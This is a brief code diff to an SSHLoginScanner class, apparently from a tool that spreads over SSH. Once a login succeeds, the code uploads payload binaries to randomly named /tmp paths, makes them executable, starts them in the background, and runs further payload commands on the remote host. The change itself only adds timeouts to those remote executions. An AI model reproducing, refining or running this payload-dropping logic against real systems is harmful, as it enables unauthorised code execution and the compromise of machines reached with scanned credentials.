@@ -175,13 +175,13 @@ class SSHLoginScanner(LoginScanner):
                 for upload in self.payloads[arch].get('upload', []):
                     remote_path = '/'.join(['tmp', random_string()])
                     sftp.put(upload, remote_path)
-                    ssh.exec_command('chmod +x %s' % remote_path)
-                    ssh.exec_command('%s &' % remote_path)
+                    ssh.exec_command('chmod +x %s' % remote_path, timeout=self.timeout)
+                    ssh.exec_command('%s &' % remote_path, timeout=self.timeout)
                 sftp.close()
 
                 # Execute commands
                 for cmd in self.payloads[arch].get('commands', []):
-                    ssh.exec_command(cmd)
+                    ssh.exec_command(cmd, timeout=self.timeout)
             else:
                 LOG.warning('Unknown architecture %r' % arch)
 
